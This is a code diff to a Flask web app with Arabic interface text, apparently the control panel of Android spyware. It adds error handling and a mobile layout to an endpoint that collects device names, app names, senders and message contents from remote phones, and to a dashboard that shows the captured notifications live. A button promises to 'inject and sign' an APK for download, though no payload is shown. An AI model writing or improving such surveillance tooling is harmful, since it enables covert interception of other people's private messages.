@@ -27,6 +27,7 @@ init_db()
 
 # ----------------------------------------------------
 # واجهة الويب الملكية الفخمة (HTML/CSS/JS)
+# تم إصلاح رابط الخط وجعله يعمل مباشرة بدون أخطاء
 # ----------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -35,6 +36,8 @@ HTML_TEMPLATE = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AURA PREMIUM | لوحة التحكم الملكية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -85,6 +88,11 @@ HTML_TEMPLATE = """
         td { padding: 14px 12px; font-size: 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
         tr:hover { background-color: rgba(255,255,255,0.02); }
         .badge-app { background: #222; padding: 3px 8px; border-radius: 4px; font-size: 12px; color: var(--cyan); }
+        
+        @media(max-width: 768px){
+            .container{grid-template-columns:1fr;padding:20px;}
+            header{padding:15px;}
+        }
     </style>
 </head>
 <body>
@@ -145,7 +153,7 @@ class AuraApp:
 
     <script>
         function generateAPK() {
-            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادم Render الخاص بك.");
+            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادمك.");
             window.location.href = "/download/base_apk";
         }
 
@@ -165,7 +173,8 @@ class AuraApp:
                         `;
                         tbody.appendChild(tr);
                     });
-                });
+                })
+                .catch(err => console.error('خطأ في جلب البيانات:', err));
         }
 
         // تحديث مستمر كل 3 ثوانٍ لجلب البيانات فورياً
@@ -186,7 +195,7 @@ def index():
 
 @app.route('/api/notifications', methods=['POST'])
 def receive_notification():
-    data = request.json
+    data = request.get_json(silent=True)
     if not data:
         return jsonify({"status": "error", "message": "No data received"}), 400
     
@@ -195,29 +204,34 @@ def receive_notification():
     sender = data.get('sender', 'Unknown Sender')
     message = data.get('message', '')
 
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO notifications (device_name, app_name, sender, message)
-            VALUES (?, ?, ?, ?)
-        """, (device_name, app_name, sender, message))
-        conn.commit()
-
-    return jsonify({"status": "success", "message": "Notification logged successfully"})
+    try:
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO notifications (device_name, app_name, sender, message)
+                VALUES (?, ?, ?, ?)
+            """, (device_name, app_name, sender, message))
+            conn.commit()
+        return jsonify({"status": "success", "message": "Notification logged successfully"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/get_notifications', methods=['GET'])
 def get_notifications():
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
-        rows = cursor.fetchall()
-    return jsonify(rows)
+    try:
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
+            rows = cursor.fetchall()
+        return jsonify(rows)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/download/base_apk')
 def download_apk():
-    # هنا يتم وضع ملف الـ APK المجهز مسبقاً والموقع لتجنب خطأ الحزمة
-    # في الوقت الحالي سيعود كملف فارغ أو رسالة حتى ترفع ملفك الخاص
-    return "جاري تهيئة وتحميل الحزمة الموقعة رقمياً والديناميكية الخاصة بجهازك..."
+    # ضع رابط أو كود تحميل ملف APK هنا عند توفره
+    return "✅ النظام يعمل بنجاح - قم برفع ملف الـ APK الموقع هنا لتفعيل التحميل"
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get('PORT', 5000))
+    app.run(debug=False, host='0.0.0.0', port=port)
